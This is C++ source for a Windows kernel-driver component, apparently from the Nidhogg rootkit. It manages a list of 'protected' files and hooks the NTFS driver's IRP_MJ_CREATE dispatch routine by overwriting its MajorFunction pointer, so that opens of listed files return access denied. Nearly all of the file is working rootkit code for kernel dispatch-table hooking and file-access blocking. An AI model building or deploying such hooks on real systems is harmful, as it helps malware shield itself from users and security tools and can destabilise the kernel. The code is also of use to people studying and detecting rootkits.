#include "pch.h"
#include "FileHandler.h"

_IRQL_requires_max_(APC_LEVEL)
FileHandler::FileHandler() {
	if (!InitializeList(&protectedFiles))
		ExRaiseStatus(STATUS_INSUFFICIENT_RESOURCES);
	memset(callbacks, 0, sizeof(callbacks));
}

_IRQL_requires_same_
_IRQL_requires_(PASSIVE_LEVEL)
FileHandler::~FileHandler() {
	// Uninstalling NTFS hooks if there are any.
	for (int i = 0; i < SUPPORTED_HOOKED_NTFS_CALLBACKS; i++) {
		if (callbacks[i].Activated) {
			UninstallNtfsHook(i);
		}
	}

	ClearFilesList(FileType::All);
	FreeVirtualMemory(this->protectedFiles.Items);
}

_IRQL_requires_max_(APC_LEVEL)
PVOID FileHandler::GetNtfsCallback(_In_ ULONG index) const {
	if (index >= SUPPORTED_HOOKED_NTFS_CALLBACKS)
		ExRaiseStatus(STATUS_INVALID_PARAMETER);
	return callbacks[index].Address;
}

/*
* Description:
* HookedNtfsIrpCreate is responsible for handling the NTFS IRP_MJ_CREATE.
*
* Parameters:
* @DeviceObject [_Inout_ PDEVICE_OBJECT] -- Unused.
* @Irp			[_Inout_ PIRP]			 -- Received IRP.
*
* Returns:
* @status		[NTSTATUS]		 -- Whether the operation was successful or not.
*/
_IRQL_requires_max_(DISPATCH_LEVEL)
_IRQL_requires_same_
NTSTATUS HookedNtfsIrpCreate(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp) {
	auto stack = IoGetCurrentIrpStackLocation(Irp);
	UNICODE_STRING fullPath = { 0 };
	KIRQL prevIrql = PASSIVE_LEVEL;
	tNtfsIrpFunction originalFunction = nullptr;
	IrqlGuard irqlGuard = IrqlGuard();

	auto ReleaseLock = [&]() {
		irqlGuard.SetIrql(DISPATCH_LEVEL);
		KeReleaseSpinLock(&stack->FileObject->IrpListLock, prevIrql);
	};

	// If we reach here, it means something went horribly wrong.
	__try {
		originalFunction = static_cast<tNtfsIrpFunction>(NidhoggFileHandler->GetNtfsCallback(IRP_MJ_CREATE));
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		return STATUS_SUCCESS;
	}

	do {
		// Validating the file object.
		if (!stack || !stack->FileObject)
			break;

		if (stack->FileObject->FileName.Length == 0 || !stack->FileObject->FileName.Buffer)
			break;

		// Acquiring the lock to prevent accessing to the file from other drivers.
		KeAcquireSpinLock(&stack->FileObject->IrpListLock, &prevIrql);
		fullPath.Length = stack->FileObject->FileName.Length;
		fullPath.MaximumLength = stack->FileObject->FileName.MaximumLength;
		fullPath.Buffer = AllocateMemory<WCHAR*>(static_cast<SIZE_T>(fullPath.MaximumLength), false);

		if (!fullPath.Buffer) {
			ReleaseLock();
			break;
		}

		__try {
			RtlCopyUnicodeString(&fullPath, &stack->FileObject->FileName);
		}
		__except (EXCEPTION_EXECUTE_HANDLER) {
			ReleaseLock();
			break;
		}

		ReleaseLock();
		irqlGuard.SetIrql(PASSIVE_LEVEL);

		if (NidhoggFileHandler->FindFile(fullPath.Buffer, FileType::Protected, false)) {
			FreeVirtualMemory(fullPath.Buffer);
			Irp->IoStatus.Status = STATUS_ACCESS_DENIED;
			return STATUS_SUCCESS;
		}
	} while (false);
	FreeVirtualMemory(fullPath.Buffer);

	irqlGuard.UnsetIrql();
	return originalFunction(DeviceObject, Irp);
}

/*
* Description:
* InstallNtfsHook is responsible for applying NTFS hooks of given IRP.
*
* Parameters:
* @irpMjFunction [_In_ ULONG] -- IRP function.
*
* Returns:
* @status		 [NTSTATUS]	  -- Whether hooked or not.
*/
_IRQL_requires_max_(PASSIVE_LEVEL)
NTSTATUS FileHandler::InstallNtfsHook(_In_ ULONG irpMjFunction) {
	UNICODE_STRING ntfsName;
	PDRIVER_OBJECT ntfsDriverObject = nullptr;
	LONG64 functionAddress = 0;
	NTSTATUS status = STATUS_SUCCESS;

	if (callbacks[irpMjFunction].Activated)
		return STATUS_ABANDONED;

	RtlInitUnicodeString(&ntfsName, NTFS_DRIVER_PATH);
	status = ObReferenceObjectByName(&ntfsName, OBJ_CASE_INSENSITIVE, NULL, 0, *IoDriverObjectType, KernelMode, NULL, 
		reinterpret_cast<PVOID*>(&ntfsDriverObject));

	if (!NT_SUCCESS(status))
		return status;

	switch (irpMjFunction) {
		case IRP_MJ_CREATE: {
			functionAddress = reinterpret_cast<LONG64>(HookedNtfsIrpCreate);
			break;
		}
		default:
			status = STATUS_NOT_SUPPORTED;
	}
	if (!NT_SUCCESS(status)) {
		ObDereferenceObject(ntfsDriverObject);
		return status;
	}

	callbacks[irpMjFunction].Address = reinterpret_cast<PVOID>(InterlockedExchange64(
		reinterpret_cast<LONG64*>(&ntfsDriverObject->MajorFunction[irpMjFunction]),
		functionAddress));
	callbacks[irpMjFunction].Activated = true;

	ObDereferenceObject(ntfsDriverObject);
	return status;
}

/*
* Description:
* UninstallNtfsHook is responsible for removing NTFS hooks of given IRP.
*
* Parameters:
* @irpMjFunction [_In_ ULONG] -- IRP function.
*
* Returns:
* @status		 [NTSTATUS]   -- Whether removed or not.
*/
_IRQL_requires_max_(PASSIVE_LEVEL)
NTSTATUS FileHandler::UninstallNtfsHook(_In_ ULONG irpMjFunction) {
	UNICODE_STRING ntfsName;
	PDRIVER_OBJECT ntfsDriverObject = NULL;
	LONG64 functionAddress = 0;
	NTSTATUS status = STATUS_SUCCESS;

	if (!callbacks[irpMjFunction].Activated)
		return STATUS_ABANDONED;

	RtlInitUnicodeString(&ntfsName, NTFS_DRIVER_PATH);

	status = ObReferenceObjectByName(&ntfsName, OBJ_CASE_INSENSITIVE, NULL, 0, *IoDriverObjectType, KernelMode, NULL, 
		reinterpret_cast<PVOID*>(&ntfsDriverObject));

	if (!NT_SUCCESS(status))
		return status;

	switch (irpMjFunction) {
		case IRP_MJ_CREATE: {
			functionAddress = reinterpret_cast<LONG64>(this->callbacks[IRP_MJ_CREATE].Address);
			break;
		}
		default:
			status = STATUS_NOT_SUPPORTED;
	}

	if (!NT_SUCCESS(status)) {
		ObDereferenceObject(ntfsDriverObject);
		return status;
	}
	InterlockedExchange64(reinterpret_cast<LONG64*>(&ntfsDriverObject->MajorFunction[irpMjFunction]), functionAddress);
	this->callbacks[irpMjFunction].Address = nullptr;
	this->callbacks[irpMjFunction].Activated = false;

	ObDereferenceObject(ntfsDriverObject);
	return status;
}


/*
* Description:
* FindFile is responsible for searching if a file exists in the protected files list.
*
* Parameters:
* @path   [_In_ WCHAR*]   -- File's path.
* @type   [_In_ FileType] -- Type of file to search (Protected or Hidden).
* @exact  [_In_ bool]	  -- Whether to search for an exact match or not.
*
* Returns:
* @bool					  -- Whether the file was found or not.
*/
_IRQL_requires_max_(APC_LEVEL)
bool FileHandler::FindFile(_In_ WCHAR* path, _In_ FileType type, _In_ bool exact) const {
	// Due to invalild memory access exceptions, we need to ensure the path is valid at least for reading one byte.
	// Invalid path won't have even a single byte readable.
	MemoryGuard guard(path, static_cast<ULONG>(sizeof(WCHAR)), KernelMode);

	if (!guard.IsValid() || !IsValidPath(path))
		return false;
	SIZE_T pathSize = wcslen(path);
	SearchedFile searchedFile = { path, pathSize, exact };

	auto finder = [](_In_ const FileItem* entry, _In_ SearchedFile searchedFile) -> bool {
		if (!searchedFile.Exact) [[ likely ]] {
			SIZE_T prefixSize = (DRIVE_LETTER_SIZE + NT_PREFIX_SIZE);
			SIZE_T sizeToSearch = entry->FileLength - prefixSize;

			if (sizeToSearch != searchedFile.Size)
				return false;
			return _wcsnicmp(entry->FilePath + (prefixSize * sizeof(WCHAR)), searchedFile.Path, sizeToSearch) == 0;
		}
		return _wcsicmp(entry->FilePath, searchedFile.Path) == 0;
	};
	switch (type) {
	case FileType::Protected: {
		return FindListEntry<FilesList, FileItem, SearchedFile>(
			this->protectedFiles, searchedFile, finder
		);
		break;
	}
	default:
		return false;
	}
	return false;
}

/*
* Description:
* ProtectFile is responsible for adding a file to the protected files list.
*
* Parameters:
* @path   [_In_ WCHAR*] -- File's path.
*
* Returns:
* @bool					-- Whether successfully added or not.
*/
_IRQL_requires_max_(APC_LEVEL)
bool FileHandler::ProtectFile(_In_ WCHAR* path) {
	IrqlGuard guard(PASSIVE_LEVEL);

	if (!IsFileExists(path))
		return false;

	if (FindFile(path, FileType::Protected))
		return false;
	FileItem* newEntry = AllocateMemory<FileItem*>(sizeof(FileItem));

	if (!newEntry)
		return false;
	errno_t err = wcscpy_s(newEntry->FilePath, path);
	
	if (err != 0) {
		FreeVirtualMemory(newEntry);
		return false;
	}
	newEntry->FileLength = static_cast<ULONG>(wcslen(newEntry->FilePath));
	AddEntry<FilesList, FileItem>(&protectedFiles, newEntry);
	NTSTATUS status = InstallNtfsHook(IRP_MJ_CREATE);

	if (!NT_SUCCESS(status) && status != STATUS_ABANDONED) {
		RemoveListEntry<FilesList, FileItem>(&protectedFiles, newEntry);
		return false;
	}
	return true;
}

/*
* Description:
* RemoveFile is responsible for removing a file from the protected files list.
*
* Parameters:
* @path   [_In_ WCHAR*]   -- File's path.
* @type   [_In_ FileType] -- Type of file to remove (Protected or Hidden).
*
* Returns:
* @bool					  -- Whether successfully removed or not.
*/
_IRQL_requires_max_(APC_LEVEL)
bool FileHandler::RemoveFile(_In_ WCHAR* path, _In_ FileType type) {
	bool removed = false;

	if (!IsValidPath(path))
		return false;

	switch (type) {
	case FileType::Protected: {
		auto finder = [](_In_ const FileItem* item, _In_ WCHAR* path) {
			return _wcsicmp(item->FilePath, path) == 0;
		};
		FileItem* entry = FindListEntry<FilesList, FileItem, WCHAR*>(protectedFiles, path, finder);

		if (!entry)
			return false;
		removed = RemoveListEntry<FilesList, FileItem>(&protectedFiles, entry);

		if (removed) {
			if (protectedFiles.Count == 0)
				UninstallNtfsHook(IRP_MJ_CREATE);
		}
		return removed;
	}
	default:
		return false;
	}
}

/*
* Description:
* ClearFilesList is responsible for clearing the protected files list.
*
* Parameters:
* @type   [_In_ FileType] -- Type of files to clear.
*
* Returns:
* There is no return value.
*/
_IRQL_requires_max_(APC_LEVEL)
void FileHandler::ClearFilesList(_In_ FileType type) {
	switch (type) {
		case FileType::Protected:
			ClearList<FilesList, FileItem>(&this->protectedFiles);
			break;
		case FileType::All:
			ClearList<FilesList, FileItem>(&this->protectedFiles);
			break;
	}
}

/*
* Description:
* QueryFiles is responsible for getting a protected file.
*
* Parameters:
* @filesList [_Inout_ IoctlFileList*] -- Protected file to get.
*
* Returns:
* @bool								  -- Whether successfully copied or not.
*/
_IRQL_requires_max_(APC_LEVEL)
bool FileHandler::ListProtectedFiles(_Inout_ IoctlFileList* filesList) {
	PLIST_ENTRY currentEntry = nullptr;
	SIZE_T index = 0;
	FileItem* item = nullptr;
	errno_t err = 0;
	MemoryGuard fileGuard = MemoryGuard();
	AutoLock locker(protectedFiles.Lock);

	if (protectedFiles.Count == 0) {
		filesList->Count = 0;
		return true;
	}
	if (filesList->Count != protectedFiles.Count) {
		filesList->Count = protectedFiles.Count;
		return true;
	}
	currentEntry = protectedFiles.Items;
	MemoryGuard listGuard(filesList->Files, static_cast<ULONG>(protectedFiles.Count * sizeof(WCHAR)), UserMode);

	if (!listGuard.IsValid())
		return false;

	while (currentEntry->Flink != protectedFiles.Items && index < protectedFiles.Count) {
		currentEntry = currentEntry->Flink;
		item = CONTAINING_RECORD(currentEntry, FileItem, Entry);

		if (item) {
			if (!fileGuard.GuardMemory(filesList->Files[index], static_cast<ULONG>(sizeof(WCHAR) * MAX_PATH), 
				UserMode))
				return false;
			err = wcscpy_s(filesList->Files[index], MAX_PATH, item->FilePath);
			fileGuard.UnguardMemory();

			if (err != 0)
				return false;
		}
		index++;
	}
	return true;
}
